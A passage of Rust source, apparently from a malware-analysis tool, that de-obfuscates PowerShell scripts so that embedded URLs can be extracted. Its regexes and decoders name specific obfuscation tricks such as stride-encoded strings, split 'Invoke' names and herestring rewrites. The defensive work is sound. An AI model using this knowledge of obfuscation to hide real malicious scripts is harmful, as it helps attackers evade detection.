        pos = value_end;

        if parenthesized {
            let next = skip_ascii_ws(bytes, pos);
            if bytes.get(next) == Some(&b',') {
                pos = next + 1;
                continue;
            }
            if bytes.get(next) == Some(&b')') {
                return Some((next + 1, args));
            }
            pos = next;
        }
    }

    if parenthesized {
        None
    } else {
        (!args.is_empty()).then_some((arg_end, args))
    }
}

#[derive(Debug)]
enum PsNamedStaticArgValue {
    Literal(String),
    Usize(usize),
}

impl PsNamedStaticArgValue {
    fn as_literal(&self) -> Option<&str> {
        match self {
            Self::Literal(value) => Some(value),
            Self::Usize(_) => None,
        }
    }

    fn as_usize(&self) -> Option<usize> {
        match self {
            Self::Literal(_) => None,
            Self::Usize(value) => Some(*value),
        }
    }
}

fn parse_ps_named_static_literal_or_usize_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    max_args: usize,
) -> Option<(usize, Vec<(String, PsNamedStaticArgValue)>)> {
    let bytes = text.as_bytes();
    let mut args = Vec::new();
    let mut arg_end = pos;
    for _ in 0..max_args {
        pos = skip_ascii_ws(bytes, pos);
        if parenthesized && bytes.get(pos) == Some(&b')') {
            return (!args.is_empty()).then_some((pos + 1, args));
        }
        if bytes.get(pos) != Some(&b'-') {
            break;
        }
        let name_start = pos + 1;
        let mut name_end = name_start;
        while name_end < bytes.len()
            && (bytes[name_end].is_ascii_alphanumeric() || bytes[name_end] == b'_')
        {
            name_end += 1;
        }
        if name_end == name_start {
            return None;
        }
        let name = text[name_start..name_end].to_ascii_lowercase();
        pos = skip_ascii_ws(bytes, name_end);
        let (value_end, value) =
            if let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) {
                (value_end, PsNamedStaticArgValue::Literal(value))
            } else if let Some((value_end, value)) = parse_ps_usize_arg(text, pos) {
                (value_end, PsNamedStaticArgValue::Usize(value))
            } else {
                return None;
            };
        args.push((name, value));
        arg_end = value_end;
        pos = value_end;

        if parenthesized {
            let next = skip_ascii_ws(bytes, pos);
            if bytes.get(next) == Some(&b',') {
                pos = next + 1;
                continue;
            }
            if bytes.get(next) == Some(&b')') {
                return Some((next + 1, args));
            }
            pos = next;
        }
    }

    if parenthesized {
        None
    } else {
        (!args.is_empty()).then_some((arg_end, args))
    }
}

#[derive(Clone, Copy)]
enum PsTrimKind {
    Both,
    Start,
    End,
}

impl PsTrimKind {
    fn from_method(method: &str) -> Option<Self> {
        if method.eq_ignore_ascii_case("trim") {
            Some(Self::Both)
        } else if method.eq_ignore_ascii_case("trimstart") {
            Some(Self::Start)
        } else if method.eq_ignore_ascii_case("trimend") {
            Some(Self::End)
        } else {
            None
        }
    }

    fn apply_chars<'a>(self, value: &'a str, chars: &str) -> &'a str {
        match self {
            Self::Both => value.trim_matches(|ch| chars.contains(ch)),
            Self::Start => value.trim_start_matches(|ch| chars.contains(ch)),
            Self::End => value.trim_end_matches(|ch| chars.contains(ch)),
        }
    }

    fn apply_default(self, value: &str) -> &str {
        match self {
            Self::Both => value.trim(),
            Self::Start => value.trim_start(),
            Self::End => value.trim_end(),
        }
    }
}

#[derive(Clone, Copy)]
enum PsStringCaseKind {
    Lower,
    Upper,
}

impl PsStringCaseKind {
    fn from_method(method: &str) -> Option<Self> {
        if method.eq_ignore_ascii_case("tolower") {
            Some(Self::Lower)
        } else if method.eq_ignore_ascii_case("toupper") {
            Some(Self::Upper)
        } else {
            None
        }
    }

    fn apply_ascii(self, value: &str) -> String {
        match self {
            Self::Lower => value.to_ascii_lowercase(),
            Self::Upper => value.to_ascii_uppercase(),
        }
    }
}

#[derive(Clone, Copy)]
struct PsConcatExtractorPart<'a> {
    idx: usize,
    name: &'a str,
}

struct PsConcatExtractorParamBinding<'a> {
    parts: Vec<PsConcatExtractorPart<'a>>,
    arg_count: usize,
    sep: String,
    template: Option<String>,
}

fn inline_ps_literal_concat_calls(
    text: &str,
    name: &str,
    binding: PsConcatExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            let parsed = if bytes.get(pos) == Some(&b'-') {
                inline_ps_named_literal_concat_call(
                    text,
                    pos,
                    parenthesized,
                    &binding.parts,
                    &binding.sep,
                    binding.template.as_deref(),
                )
            } else {
                parse_ps_positional_literal_concat_args(text, pos, parenthesized, &binding)
                    .map(|(call_end, value)| (call_end, format!("'{}'", value.replace('\'', "''"))))
            };
            let Some((call_end, replacement)) = parsed else {
                search_from = end_name;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_positional_literal_concat_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: &PsConcatExtractorParamBinding<'_>,
) -> Option<(usize, String)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding
            .parts
            .iter()
            .any(|part| part.idx >= binding.arg_count)
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut values = vec![None; binding.parts.len()];
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        for (part_idx, part) in binding.parts.iter().enumerate() {
            if idx == part.idx {
                values[part_idx] = Some(arg.as_str()?.to_string());
            }
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    let mut chunks = Vec::with_capacity(values.len());
    for part in values {
        chunks.push(part?);
    }
    let value = if let Some(template) = &binding.template {
        apply_ps_numbered_format_template(template, &chunks)?
    } else {
        let mut value = String::new();
        for (idx, part) in chunks.into_iter().enumerate() {
            if idx > 0 {
                value.push_str(&binding.sep);
            }
            value.push_str(&part);
        }
        value
    };
    (value.len() <= 8192).then_some((arg_end, value))
}

fn inline_ps_named_literal_concat_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    parts: &[PsConcatExtractorPart<'_>],
    sep: &str,
    template: Option<&str>,
) -> Option<(usize, String)> {
    let (call_end, args) =
        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 8)?;
    let mut chunks = Vec::with_capacity(parts.len());
    for part in parts {
        let chunk = args
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(part.name))?
            .1
            .as_literal()?;
        chunks.push(chunk.to_string());
    }
    let value = if let Some(template) = template {
        apply_ps_numbered_format_template(template, &chunks)?
    } else {
        chunks.join(sep)
    };
    if value.len() > 8192 {
        return None;
    }
    Some((call_end, format!("'{}'", value.replace('\'', "''"))))
}

fn apply_ps_numbered_format_template(template: &str, chunks: &[String]) -> Option<String> {
    let mut out = template.to_string();
    for (idx, chunk) in chunks.iter().enumerate() {
        out = out.replace(&format!("{{{idx}}}"), chunk);
        if out.len() > 8192 {
            return None;
        }
    }
    if out.contains("{") || out.contains("}") {
        return None;
    }
    Some(out)
}

fn inline_ps_literal_split_index_calls(
    text: &str,
    name: &str,
    binding: PsSplitExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_split_index_call(
                    text,
                    pos,
                    parenthesized,
                    binding.value_name,
                    binding.sep_name,
                    binding.index_name,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value, sep, index)) =
                parse_ps_positional_literal_split_index_args(text, pos, parenthesized, binding)
            else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_split_index_replacement(&value, &sep, index) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[derive(Clone, Copy)]
struct PsSplitExtractorParamBinding<'a> {
    value_idx: usize,
    value_name: &'a str,
    sep_idx: usize,
    sep_name: &'a str,
    index_idx: usize,
    index_name: &'a str,
    arg_count: usize,
}

fn parse_ps_positional_literal_split_index_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: PsSplitExtractorParamBinding<'_>,
) -> Option<(usize, String, String, usize)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding.value_idx >= binding.arg_count
        || binding.sep_idx >= binding.arg_count
        || binding.index_idx >= binding.arg_count
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut sep = None;
    let mut index = None;
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == binding.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == binding.sep_idx {
            sep = Some(arg.as_str()?.to_string());
        }
        if idx == binding.index_idx {
            index = Some(arg.as_usize()?);
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, sep?, index?))
}

fn inline_ps_named_literal_split_index_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    sep_name: &str,
    index_name: &str,
) -> Option<(usize, String)> {
    let (call_end, args) =
        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_literal()?;
    let sep = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(sep_name))?
        .1
        .as_literal()?;
    let index = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(index_name))?
        .1
        .as_usize()?;
    if value.len() > 8192 || sep.is_empty() {
        return None;
    }
    let part = value.split(sep).nth(index)?;
    if part.len() > 8192 {
        return None;
    }
    Some((call_end, format!("'{}'", part.replace('\'', "''"))))
}

enum PsLiteralOrUsizeArg {
    Str(String),
    Usize(usize),
}

impl PsLiteralOrUsizeArg {
    fn as_str(&self) -> Option<&str> {
        match self {
            Self::Str(value) => Some(value.as_str()),
            Self::Usize(_) => None,
        }
    }

    fn as_usize(&self) -> Option<usize> {
        match self {
            Self::Str(_) => None,
            Self::Usize(value) => Some(*value),
        }
    }
}

fn parse_ps_literal_or_usize_arg(text: &str, pos: usize) -> Option<(usize, PsLiteralOrUsizeArg)> {
    if let Some((end, value)) = parse_ps_static_quoted_literal(text, pos) {
        return Some((end, PsLiteralOrUsizeArg::Str(value)));
    }
    let (end, value) = parse_ps_usize_arg(text, pos)?;
    Some((end, PsLiteralOrUsizeArg::Usize(value)))
}

fn skip_ps_arg_separator(bytes: &[u8], pos: usize, parenthesized: bool) -> usize {
    let mut pos = skip_ascii_ws(bytes, pos);
    if parenthesized && bytes.get(pos) == Some(&b',') {
        pos += 1;
    }
    skip_ascii_ws(bytes, pos)
}

fn parse_ps_positional_static_literal_arg(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    value_idx: usize,
    arg_count: usize,
) -> Option<(usize, String)> {
    if arg_count == 0 || value_idx >= arg_count || arg_count > 8 {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut arg_end = pos;
    for idx in 0..arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?))
}

fn inline_ps_literal_calls(text: &str, name: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();

    for needle in needles {
        let mut search_from = 0;
        while let Some(rel) = lower[search_from..].find(&needle) {
            let start = search_from + rel;
            let end_name = start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) != Some(&b'\'') {
                search_from = end_name;
                continue;
            }
            let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
                search_from = end_name;
                continue;
            };
            let mut call_end = literal_end;
            if parenthesized {
                let after = skip_ascii_ws(bytes, call_end);
                if bytes.get(after) != Some(&b')') {
                    search_from = end_name;
                    continue;
                }
                call_end = after + 1;
            }
            matches.push((replace_start, call_end, value));
            search_from = call_end;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn is_ident_byte(byte: Option<u8>) -> bool {
    byte.is_some_and(|b| b.is_ascii_alphanumeric() || b == b'_')
}

fn skip_ascii_ws(bytes: &[u8], mut pos: usize) -> usize {
    while bytes.get(pos).is_some_and(|b| b.is_ascii_whitespace()) {
        pos += 1;
    }
    pos
}

fn parse_ps_single_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    let bytes = text.as_bytes();
    if bytes.get(start) != Some(&b'\'') {
        return None;
    }
    let mut pos = start + 1;
    let mut out = String::new();
    while pos < bytes.len() {
        if bytes[pos] == b'\'' {
            if bytes.get(pos + 1) == Some(&b'\'') {
                out.push('\'');
                pos += 2;
                continue;
            }
            return Some((pos + 1, out));
        }
        let ch = text[pos..].chars().next()?;
        out.push(ch);
        pos += ch.len_utf8();
    }
    None
}

#[allow(clippy::expect_used)]
static SKIP_NTH_FOR_SUBSTRING_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{[^{}]*?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]*?;\s*\$(\w+)\s*\+=\s*(\d+)\s*\)\s*\{[^{}]*?\.\s*'su'\s*\.\s*'Invoke'\s*\(\s*\$(\w+)\s*,"#,
    )
    .expect("skip-nth for substring def")
});

// Musculos-style `do { $acc += $param[$idx]; $idx += STEP } until (!$param[$idx])`
// stride decoder. Same call shape as SKIP_NTH_FOR_SUBSTRING (NAME 'carrier'), but
// the function body uses do/until instead of for. Captures: 1=function name,
// 2=index-var (init), 3=start, 4=index-var (increment) — must equal 2,
// 5=step.
#[allow(clippy::expect_used)]
static MUSCULOS_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{\s*\$(\w+)\s*=\s*(\d+)\s*;\s*do\s*\{[^{}]*?\$\w+\s*\+=\s*\$\w+\[\s*\$\w+\s*\][^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}\s*until\s*\(\s*!\s*\$\w+\[\s*\$\w+\s*\]\s*\)"#,
    )
    .expect("musculos stride def")
});

#[allow(clippy::expect_used)]
static DO_WHILE_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)[^)]*\)\s*\{[^{}]*?\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^;\r\n{}]{1,128})[;\r\n]+[^{}]*?do\s*\{[^{}]*?\$\w+\s*\+=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\][^{}]*?\$([A-Za-z_][A-Za-z0-9_]*)\s*\+=\s*(\d+)[^{}]*?\}\s*(?:until\s*\(\s*!\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]\s*\)|while\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]\s*\))"#,
    )
    .expect("do/while stride def")
});

fn expand_skip_nth(text: &str) -> String {
    let mut out = text.to_string();
    // Collect all function definitions with their skip parameters
    let defs: Vec<(String, usize, usize)> = SKIP_NTH_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            // fn name: group 1 (function NAME) or group 2 (-n NAME)
            let fn_name = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            // body: group 3
            let body = caps.get(3)?.as_str();
            // step: group 5 (the $idx += N value)
            let step: usize = caps.get(5)?.as_str().parse().ok()?;
            if step == 0 || step > 10 {
                return None;
            }
            // Find start index: look for $VAR = N initializer in the body
            // The init variable should match the step variable (group 4)
            let idx_var = caps.get(4)?.as_str();
            let start: usize = SKIP_NTH_INIT_RE
                .captures_iter(body)
                .find(|c| c.get(1).map(|m| m.as_str()) == Some(idx_var))
                .and_then(|c| c.get(2)?.as_str().parse().ok())
                .unwrap_or(1);
            if start > 10 {
                return None;
            }
            Some((fn_name, start, step))
        })
        .collect();

    for (name, start, step) in defs {
        // Find call sites: NAME 'carrier' / NAME "carrier" / NAME('carrier')
        // / NAME ( "carrier" ). The leading `(?:^|[^\w])` is a manual word
        // boundary that prevents `BarFoo('x')` from matching when the
        // function name is `Foo` — `\b` alone would happily anchor at the
        // `F` inside `BarFoo`. Carrier minimum length 4: at start≥1 step≥1
        // a 1-3 char carrier almost never decodes to a meaningful token,
        // and lower limits invited false rewrites on unrelated literals.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{4,2048}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                // The `(?:^|[^\w])` prefix consumes a delimiter char (when
                // not at line start) that's NOT part of the call we want to
                // rewrite. Keep that char in the output so the surrounding
                // token / line structure isn't damaged.
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];

                let chars: Vec<char> = carrier.chars().collect();
                let mut decoded = String::new();
                let mut i = start;
                while i < chars.len() {
                    decoded.push(chars[i]);
                    i = i.checked_add(step).unwrap_or(chars.len());
                }
                if decoded.is_empty() {
                    return None;
                }
                let replacement = format!("{}'{}'", prefix, decoded.replace('\'', ""));
                Some((full.start(), full.end(), replacement))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }
    out
}

fn expand_skip_nth_for_substring(text: &str) -> String {
    let mut out = text.to_string();
    let mut defs: Vec<(String, usize, usize)> =
        if contains_ascii_case_insensitive_bytes(text, b"'su'")
            && contains_ascii_case_insensitive_bytes(text, b"'invoke'")
        {
            SKIP_NTH_FOR_SUBSTRING_DEF_RE
                .captures_iter(text)
                .filter_map(|caps| {
                    let name = caps.get(1)?.as_str().to_string();
                    let init_var = caps.get(2)?.as_str();
                    let step_var = caps.get(4)?.as_str();
                    let invoke_var = caps.get(6)?.as_str();
                    if !init_var.eq_ignore_ascii_case(step_var)
                        || !init_var.eq_ignore_ascii_case(invoke_var)
                    {
                        return None;
                    }
                    let start: usize = caps.get(3)?.as_str().parse().ok()?;
                    let step: usize = caps.get(5)?.as_str().parse().ok()?;
                    if start > 10 || step == 0 || step > 10 {
                        return None;
                    }
                    Some((name, start, step))
                })
                .collect()
        } else {
            Vec::new()
        };
    // Musculos-style do/until variants. Same (start, step) carrier semantics.
    defs.extend(MUSCULOS_DEF_RE.captures_iter(text).filter_map(|caps| {
        let name = caps.get(1)?.as_str().to_string();
        let init_var = caps.get(2)?.as_str();
        let inc_var = caps.get(4)?.as_str();
        if !init_var.eq_ignore_ascii_case(inc_var) {
            return None;
        }
        let start: usize = caps.get(3)?.as_str().parse().ok()?;
        let step: usize = caps.get(5)?.as_str().parse().ok()?;
        if start > 10 || step == 0 || step > 10 {
            return None;
        }
        Some((name, start, step))
    }));
    let integer_bindings = ps_integer_bindings(text);
    defs.extend(
        DO_WHILE_STRIDE_DEF_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let name = caps.get(1)?.as_str().to_string();
                let param_var = caps.get(2)?.as_str();
                let init_var = caps.get(3)?.as_str();
                let start_expr = caps.get(4)?.as_str();
                let source_var = caps.get(5)?.as_str();
                let index_ref_var = caps.get(6)?.as_str();
                let inc_var = caps.get(7)?.as_str();
                let step: usize = caps.get(8)?.as_str().parse().ok()?;
                let (cond_source_var, cond_index_var) =
                    if let (Some(source), Some(index)) = (caps.get(9), caps.get(10)) {
                        (source.as_str(), index.as_str())
                    } else {
                        (caps.get(11)?.as_str(), caps.get(12)?.as_str())
                    };
                if !param_var.eq_ignore_ascii_case(source_var)
                    || !param_var.eq_ignore_ascii_case(cond_source_var)
                    || !init_var.eq_ignore_ascii_case(index_ref_var)
                    || !init_var.eq_ignore_ascii_case(inc_var)
                    || !init_var.eq_ignore_ascii_case(cond_index_var)
                {
                    return None;
                }
                let start = resolve_ps_usize_expr(start_expr, &integer_bindings)?;
                if start > 512 || step == 0 || step > 32 {
                    return None;
                }
                Some((name, start, step))
            }),
    );

    for (name, start, step) in defs {
        // Accept both NAME 'carrier' and NAME('carrier') / NAME ( 'carrier' ).
        // Manual word boundary `(?:^|[^\w])` so `Foo` doesn't match inside
        // `MyFoo('xy')`. Carrier excludes `{` `}` to avoid greedily eating
        // body-literal braces from an unrelated PS function body.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{6,8192}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];
                let chars: Vec<char> = carrier.chars().collect();
                let mut decoded = String::new();
                let mut i = start;
                while i < chars.len() {
                    decoded.push(chars[i]);
                    i = i.checked_add(step).unwrap_or(chars.len());
                }
                if decoded.len() < 3 {
                    return None;
                }
                Some((
                    full.start(),
                    full.end(),
                    format!("{}'{}'", prefix, decoded.replace('\'', "")),
                ))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }

    out
}

// Matches `$NAME = @'\n...body...\n'@`. Captures: 1=var name, 2=body. The
// `'+` on each side accepts both the original form and the doubled-quote
// form that arises when the herestring is itself embedded inside a wrapping
// single-quoted PS literal (common after `[Convert]::FromBase64String('...')`
// inlining). The closing `'@` should be at column 0 in strict PS, but
// obfuscators often deviate, so we just require the marker pair.
#[allow(clippy::expect_used)]
static PS_HERESTRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)\$([A-Za-z_]\w*)\s*=\s*@'+\r?\n(.*?)\r?\n'+@"#).expect("ps herestring assign")
});

// `$DST = $SRC -replace 'NEEDLE', 'REPL'` — captures dst, src, needle, repl.
// PowerShell also accepts -ireplace/-creplace for explicit case behavior.
// Outer quote count is constrained to 1 or 2 so the matcher works both for
// the original form (`'a','b'`) and the doubled-quote form (`''a'','b''`)
// that arises when the chain is inlined inside a wrapping single-quoted PS
// literal. Inner pattern allows `''` as a single-quote escape but forbids
// `\n` so we never accidentally extend the match across a line.
#[allow(clippy::expect_used)]
static PS_VAR_REPLACE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_]\w*)\s*=\s*\$([A-Za-z_]\w*)\s*-(?:[ic])?replace\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}\s*,\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}"#,
    )
    .expect("ps var replace assign")
});

/// Pre-pass over a PowerShell text: expand common obfuscation patterns so that
/// subsequent URL-extraction regexes see literal strings.
fn expand_obfuscation(text: &str) -> String {
    let expand_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_PS1_EXPAND").is_some();
    let mut out = join_powershell_line_continuations(&normalize_powershell_quotes(text));
    macro_rules! profile_expand_step {
        ($stage:literal, $iter:expr, $body:block) => {{
            if expand_profile_enabled {
                let before_len = out.len();
                let start = std::time::Instant::now();
                let result = { $body };
                eprintln!(
                    "harrington_profile_ps1_expand stage={} iter={} delta_ms={} bytes_before={} bytes_after={}",
                    $stage,
                    $iter,
                    start.elapsed().as_millis(),
                    before_len,
                    out.len()
                );
                result
            } else {
                $body
            }
        }};
    }
    for iter in 0..8 {
        let signal_start = std::time::Instant::now();
        let signals = PsObfuscationSignals::new(&out);
        if expand_profile_enabled {
            eprintln!(
                "harrington_profile_ps1_expand stage=signals iter={} delta_ms={} bytes_before={} bytes_after={}",
                iter,
                signal_start.elapsed().as_millis(),
                out.len(),
                out.len()
            );
        }
        if !signals.has_any_expansion_signal() {
            break;
        }
        let clone_start = std::time::Instant::now();
        let before = out.clone();
        if expand_profile_enabled {
            eprintln!(
                "harrington_profile_ps1_expand stage=iteration_clone iter={} delta_ms={} bytes_before={} bytes_after={}",
                iter,
                clone_start.elapsed().as_millis(),
                out.len(),
                out.len()
            );
        }
        profile_expand_step!("wrappers", iter, {
            if signals.argument_list {
                out = expand_start_process_argument_list(&out);
            }
            if signals.invoke_wrapper {
                out = expand_invoke_expression_wrappers(&out);
            }
        });
        profile_expand_step!("dot_substring_pre", iter, {
            if signals.dot_replace {
                out = expand_ps_dot_replace(&out);
            }
            if signals.trim_extractor {
                out = expand_literal_trim_extractor_calls(&out);
            }
            if signals.substring {
                out = expand_ps_dot_substring(&out);
                out = expand_literal_substring_extractor_calls(&out);
            }
            if signals.remove_extractor {
                out = expand_literal_remove_extractor_calls(&out);
            }
            if signals.insert_extractor {
                out = expand_literal_insert_extractor_calls(&out);
            }
            if signals.string_case_extractor {
                out = expand_literal_string_case_extractor_calls(&out);
            }
            if signals.literal_concat_extractor {
                out = expand_literal_concat_extractor_calls(&out);
            }
            if signals.literal_index_extractor {
                out = expand_literal_index_extractor_calls(&out);
            }
            if signals.split_index {
                out = expand_literal_split_index_extractor_calls(&out);
            }
        });
        profile_expand_step!("embedded_single_quote", iter, {
            if signals.embedded_single_quote_assignment {
                out = expand_ps_embedded_single_quote_assignments(&out);
            }
        });
        profile_expand_step!("doubled_quote_literals", iter, {
            if signals.doubled_single_quote {
                out = expand_doubled_quote_literals(&out);
            }
        });
        profile_expand_step!("skip_nth", iter, {
            if signals.skip_nth {
                out = expand_skip_nth(&out); // skip-nth-char decoder (Pattern B)
                out = expand_skip_nth_for_substring(&out);
            }
        });
        profile_expand_step!("char_cast", iter, {
            if signals.char_cast {
                out = expand_char_concat(&out);
                out = expand_char_literal_concat(&out);
                out = expand_string_join_char_arrays(&out);
                out = expand_unary_join_char_arrays(&out);
                out = expand_char_array_concat_chunks(&out);
                out = expand_char_array_chunks(&out); // char-array chunk decoder (Pattern D)
            }
        });
        profile_expand_step!("literal_composition", iter, {
            if signals.hex_split {
                out = expand_hex_split_char_loop(&out);
            }
            if signals.space_concat {
                out = expand_space_concat(&out); // space-separated string array (Pattern C)
            }
            if signals.single_quote_concat {
                out = expand_string_concat(&out);
                out = expand_parenthesized_string_concat(&out);
                out = expand_mixed_static_string_concat(&out);
            }
            if signals.double_quote_concat {
                out = expand_double_string_concat(&out);
                out = expand_mixed_static_string_concat(&out);
            }
            if signals.format {
                out = expand_format_literals(&out);
                out = expand_ps_string_format_static(&out);
            }
        });
        profile_expand_step!("encoded_payloads", iter, {
            if signals.xor_base64_function {
                out = expand_xor_base64_function_calls(&out);
            }
            if signals.compressed_base64 {
                out = expand_gzip_function_base64_variables(&out);
                out = expand_gzip_base64_literals(&out);
            }
            if signals.json_script_base64 {
